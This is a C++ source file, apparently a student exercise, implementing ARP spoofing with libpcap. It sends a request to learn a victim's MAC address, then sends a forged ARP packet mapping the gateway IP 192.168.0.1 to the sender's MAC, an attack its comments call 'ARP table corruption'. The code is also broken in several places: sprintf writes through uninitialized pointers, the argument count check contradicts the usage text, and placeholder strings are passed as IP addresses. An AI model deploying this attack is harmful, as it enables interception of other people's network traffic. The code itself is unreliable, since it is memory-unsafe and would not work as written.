#include <cstdio>
#include <libnet.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

char* ret_mac(uint8_t mac[]) {
	char *c_mac;
	sprintf(c_mac, "%X:%X:%X:%X:%X:%X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return c_mac;
}

char* return_mac(char *dev)
{
	int fd;
	struct ifreq ifr;
	char *iface = "eth0";
    char *real_mac;
	unsigned char *mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);
	
	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	
	//display mac address
	//printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    sprintf(real_mac,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return real_mac;
}

int send_arp(pcap_t *handle, char* smac, char* dmac, char* arp_smac, char* arp_tmac, char* arp_sip, char* arp_tip);
int recog_mac(pcap_t *handle);
struct EthArpPacket recv_arp(pcap_t *handle);

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage : send-arp <interface> <sender ip(victim)> <target ip(gateway)>\n");
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_BUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)n", dev, errbuf);
    }

    // first step => Send ARP Request to Victim (Normal ARP Packet)
    send_arp(handle, return_mac(dev), "FF:FF:FF:FF:FF:FF", return_mac(dev), "00:00:00:00:00:00", "Attaker's IP", "Victim's IP");

    // second step => Recieve ARP Request from Victim (Normal ARP Packet), To Recognize victim's MAC address
    struct EthArpPacket temp = recv_arp(handle);

    if(temp.arp_.hln_ == 0) {
        printf("Packet data doesn't received.\n");
    }
    // third step => Send ARP Request to Victim (ARP table corruption)

    send_arp(handle, return_mac(dev), ret_mac(temp.eth_.smac_) , return_mac(dev), ret_mac(temp.eth_.smac_), "192.168.0.1", "Victim's IP");

    return 0;
}

int send_arp(pcap_t *handle, char* smac, char* dmac, char* arp_smac, char* arp_tmac, char* arp_sip, char* arp_tip) {
    struct EthArpPacket packet;
    
    packet.eth_.dmac_ = Mac(dmac);
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

}

struct EthArpPacket recv_arp(pcap_t *handle) { // recognize sender's mac address
    struct pcap_pkthdr* header;
	const u_char* packet;
    struct EthArpPacket recv = {0, };
	int protocol;
	int res = pcap_next_ex(handle, &header, &packet);

	if (res == -1 || res == -2) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        return recv;
	}	
	
    struct EthHdr *recv_eth = (struct EthHdr *)packet;
    packet += sizeof(struct EthHdr);
    struct ArpHdr *recv_arp = (struct ArpHdr *)packet;
    
    
    recv.eth_ = *recv_eth;
    recv.arp_ = *recv_arp;

    return recv;
}
